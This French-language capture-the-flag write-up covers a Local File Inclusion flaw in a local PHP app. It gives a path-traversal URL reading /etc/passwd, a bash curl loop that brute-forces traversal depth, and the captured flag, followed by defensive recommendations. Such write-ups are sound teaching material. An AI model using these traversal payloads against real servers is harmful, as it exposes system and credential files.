# Inclusion de Fichiers Locaux (LFI) - Processus de Détection

## Vulnérabilité Détectée

L'application web contient une vulnérabilité **Local File Inclusion (LFI)** qui permet de lire des fichiers arbitraires sur le serveur.

Lors de l'analyse de l'application, nous avons identifié un paramètre GET suspect dans l'URL :
```
http://localhost:8080/index.php?page=<value>
```

Le paramètre `page` semble être utilisé pour l'inclusion dynamique de fichiers.

On tente d'accéder à un fichier système sensible (`/etc/passwd`) en utilisant la technique **path traversal** avec des séquences `../` :

```
http://localhost:8080/index.php?page=/../../../../../../../etc/passwd
```

Script pour trouver pour trouver le nombre exact de traversées de répertoires (`../`) nécessaires: 

```bash
for i in {0..8}; do
    curl -s "http://localhost:8080/index.php?page=$(printf '../%.0s' $(seq 1 $i))etc/passwd" | head -3
done
```


Le serveur a renvoyé différentes alertes JavaScript selon la profondeur :
- `0-5 traversées` : Différents messages d'erreur ("Wtf ?", "Wrong..", "Nope..", "Almost.", "Still nope..")
- `6 traversées` : **"Nope.."**
- `7 traversées` : **"Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0"**
- `8 traversées` : Même résultat que 7

```
http://localhost:8080/index.php?page=../../../../../../../etc/passwd
```

## Impact de la Vulnérabilité

Cette vulnérabilité permet à un attaquant de :
- Lire des fichiers système sensibles (`/etc/passwd`, `/etc/shadow`, etc.)
- Accéder aux fichiers de configuration de l'application
- Découvrir des informations critiques (identifiants, clés API, etc.)
- Exfiltrer le code source de l'application

## Comment se Protéger

Exemple : utiliser basename() pour supprimer les niveaux d'ecces au path "../"

```bash
echo "Input: ../../../etc/passwd"
echo "Après basename: $(php -r 'echo basename("../../../etc/passwd");')"
```

## Recommandations de Sécurité

- Validation Stricte des Entrées : utiliser une liste blanche (whitelist) de valeurs acceptées, valider les données rentrées par l'utilisateur

- Nettoyage des Chemins (Path Sanitization) : Utiliser `basename()` pour éliminer les séquences `../`, `realpath()` pour résoudre le chemin absolu, vérifier que le chemin final reste dans le répertoire autorisé

- Limiter l'accès aux fichiers à un répertoire spécifique
- Configurer les permissions du système de fichiers correctement
- Utiliser un environnement chroot si possible

- Utiliser un système de routing sécurisé notamment avec des frameworks modernes
- Éviter les fonctions `include()`, `require()` avec des paramètres utilisateur

- Configuration du Serveur, dans le php.ini en php

- Logger toutes les tentatives d'accès suspectes
- Mettre en place des alertes pour les patterns d'attaque
- Analyser régulièrement les logs pour détecter les tentatives d'exploitation

### Sources
- OWASP - Path Traversal
- OWASP - File Inclusion Vulnerabilities
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- Claude AI

